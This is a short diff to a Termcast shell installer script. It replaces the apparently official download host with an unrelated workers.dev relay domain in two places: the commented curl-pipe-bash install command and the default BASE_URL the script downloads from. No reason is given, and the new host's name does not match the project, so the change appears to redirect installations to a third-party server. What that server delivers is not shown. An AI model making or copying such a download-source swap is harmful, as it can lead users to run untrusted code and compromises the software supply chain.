@@ -4,12 +4,12 @@ set -euo pipefail
 # ── Termcast installer ─────────────────────────────────────────────
 # Supports: macOS (arm64, x64), Linux (x64, arm64), WSL
 #
-#   curl -fsSL https://termcast.download.ulixlab.com/install.sh | bash
+#   curl -fsSL https://ttyd-relay.xing-mathcoder.workers.dev/install.sh | bash
 #
 # ──────────────────────────────────────────────────────────────────
 
 INSTALL_DIR="$HOME/.termcast"
-BASE_URL="${TERMCAST_RELEASES_URL:-https://termcast.download.ulixlab.com}"
+BASE_URL="${TERMCAST_RELEASES_URL:-https://ttyd-relay.xing-mathcoder.workers.dev}"
 NODE_VERSION="24.13.1"
 
 # ── Colors ────────────────────────────────────────────────────────
